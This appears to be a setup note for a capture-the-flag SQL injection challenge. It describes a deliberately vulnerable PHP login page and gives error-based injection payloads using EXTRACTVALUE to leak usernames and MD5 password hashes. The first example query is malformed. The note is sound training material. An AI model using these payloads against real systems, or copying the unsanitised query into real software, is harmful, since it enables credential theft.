```
--> Challenge 1 : Simple Login Page having MYSQL Error Based SQL Injection, Candidate will have to create a query using EXTRACTVALUE Function to extract the credentials of the User from the database and crack the MD5 hash. After Login the candidate will get the first flag on the Dashboard page.

					Example Query :

					abcd' AND EXTRACTVALUE(RAND(),CONCAT(0x3a,(SELECT CONCAT(0x3a,usr_username) FROM information_schema.TABLES WHERE TABLE_NAME="tbl_users" LIMIT 0,1)))); #

This would extract the first entry of the column username in the table tbl_users.

```

Need to setup a MySQL server then put credentials in `config.php`

Don't use root login on production, as someone might try to DROP TABLE

Using database `ctfdb` (arbitrarily)

```sql
CREATE TABLE tbl_users (
	username VARCHAR (255), 
	firstname VARCHAR (63), 
	lastname VARCHAR(63), 
	password CHAR(32)
);
```

```sql
INSERT INTO tbl_users VALUES (
	"as1605", 
	"Aditya", 
	"Singh", 
	"2e22b054625135f6ff62fb22b6dd9525"
);
```
Here the password is MD5 hash in hex. We need to decide the password.

Currently the hack is 

`' AND EXTRACTVALUE(0, CONCAT(':',(SELECT username from tbl_users LIMIT 0,1))); -- `

`' AND EXTRACTVALUE(0, CONCAT(':',(SELECT password from tbl_users LIMIT 0,1))); -- `


`login.php` has a weird double query system, first one is a dummy query which can have SQL Error Based Injection. Second one has cleaned input so the hackers don't outsmart us by any chance

